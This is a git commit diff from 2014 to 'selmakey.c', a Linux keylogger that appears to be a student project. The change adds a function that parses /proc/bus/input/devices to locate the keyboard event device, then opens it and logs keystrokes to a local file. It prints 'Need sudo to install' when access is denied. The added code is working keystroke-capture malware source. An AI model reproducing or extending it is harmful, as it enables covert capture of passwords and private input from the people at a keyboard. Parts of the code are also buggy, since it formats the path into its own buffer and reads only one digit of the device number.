bedd78d3e4bb12881eb5cc09df7a4a3a766dd42f
casoni_f <fabien.casoni@epitech.eu>
2014-07-03 18:31:04 +0200

    trouve le bon device

--- special/selmakey.c
+++ special/selmakey.c
@@ -5,7 +5,7 @@
 ** Login   <casoni_f@epitech.net>
 ** 
 ** Started on  Wed Jul  2 18:19:29 2014 Fabien Casoni
-** Last update Wed Jul  2 18:59:49 2014 Fabien Casoni
+** Last update Thu Jul  3 18:30:42 2014 Fabien Casoni
 */
 
 #include <stdio.h>
@@ -40,12 +40,40 @@ void			start_keylog(t_kl *kl)
   fclose(kl->file);
 }
 
+void			find_kbd(char *path)
+{
+  FILE			*fd;
+  int			found;
+  char			buff[10][412];
+
+  found = 0;
+  fd = fopen("/proc/bus/input/devices", "r");
+  sprintf(path, "/dev/input/event");
+  while (!found && fscanf(fd, "%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n",
+			  buff[0], buff[1], buff[2], buff[3], buff[4],
+			  buff[5], buff[6], buff[7], buff[8], 
+			  buff[9]) > 0)
+    if (strstr(buff[1], "keyboard") != NULL
+	|| strstr(buff[1], "Keyboard") != NULL)
+      {
+	sprintf(path, "%s%c", path, buff[5][strlen(buff[5]) - 1]);
+	found = 1;
+      }
+  fclose(fd);
+}
+
 int			main()
 {
   t_kl			*kl;
+  char			path[4096];
 
   kl = malloc(sizeof(*kl));
-  kl->fd = open("/dev/input/event3", O_RDONLY);
+  find_kbd(path);
+  if ((kl->fd = open(path, O_RDONLY)) == -1)
+    {
+      printf("Need sudo to install.\n");
+      return (0);
+    }
   kl->file = fopen("test.log", "w");
   kl->epoll_fd = epoll_create(sizeof(kl->fd));
   kl->epoll_event.events = EPOLLIN;
@@ -53,4 +81,5 @@ int			main()
 		       kl->fd, &(kl->epoll_event));
   start_keylog(kl);
   free(kl);
+  return (1);
 }
